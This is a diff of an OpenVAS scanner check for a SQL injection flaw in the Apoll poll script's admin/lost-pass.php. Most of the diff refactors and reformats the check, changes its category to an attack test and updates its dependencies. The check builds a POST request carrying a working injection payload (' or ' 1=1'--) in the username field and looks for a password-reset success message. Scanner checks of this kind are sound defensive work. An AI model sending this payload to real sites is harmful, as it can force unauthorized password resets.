@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: apoll_7_5_sql_injection.nasl 4574 2016-11-18 13:36:58Z teissa $
+# $Id: apoll_7_5_sql_injection.nasl 5767 2017-03-29 13:32:35Z cfi $
 #
 # Dragan Mitic Apoll 'admin/lost-pass.php' SQL Injection Vulnerability
 #
@@ -24,21 +24,19 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.100023");
- script_version("$Revision: 4574 $");
- script_tag(name:"last_modification", value:"$Date: 2016-11-18 14:36:58 +0100 (Fri, 18 Nov 2016) $");
+ script_version("$Revision: 5767 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 15:32:35 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
  script_name("Dragan Mitic Apoll 'admin/lost-pass.php' SQL Injection Vulnerability");
-
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
- script_dependencies("vbulletin_detect.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "solution" , value : "Upgrade to newer Version if available at http://www.miticdjd.com/index/scripts/apoll/.");
@@ -61,32 +59,27 @@ if(!can_host_php(port:port))exit(0);
 
 host = http_host_name( port:port );
 
-dirs = make_list("/apoll","/poll", cgi_dirs());
+foreach dir( make_list_unique( "/apoll", "/poll", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
+  variables = string("username=select username from ap_users' or ' 1=1'-- '&email=openVAS@" + host);
+  if( dir == "/" ) dir = "";
+  url = string(dir + "/admin/lost-pass.php");
 
-    variables = string("username=select username from ap_users' or ' 1=1'-- '&email=openVAS@" + host);
-    filename = string(dir + "/admin/lost-pass.php");
+  req = string(
+    "POST ", url, " HTTP/1.0\r\n",
+    "Referer: ","http://", host, url, "\r\n",
+    "Host: ", host, "\r\n",
+    "Content-Type: application/x-www-form-urlencoded\r\n",
+    "Content-Length: ", strlen(variables),
+    "\r\n\r\n",
+    variables);
 
-    req = string(
-      "POST ", filename, " HTTP/1.0\r\n", 
-      "Referer: ","http://", host, filename, "\r\n",
-      "Host: ", host, "\r\n", 
-      "Content-Type: application/x-www-form-urlencoded\r\n", 
-      "Content-Length: ", strlen(variables), 
-      "\r\n\r\n", 
-      variables
-    );
-
-    result = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-    if(
-       egrep(pattern: "You successfully generate new password", string: result)
-      ) 
-       {
-         security_message(port:port);
-         exit(0);
-       }
-  
+  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
+  if( egrep(pattern: "You successfully generate new password", string: res) ) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
 
-exit(99);
+exit( 99 );
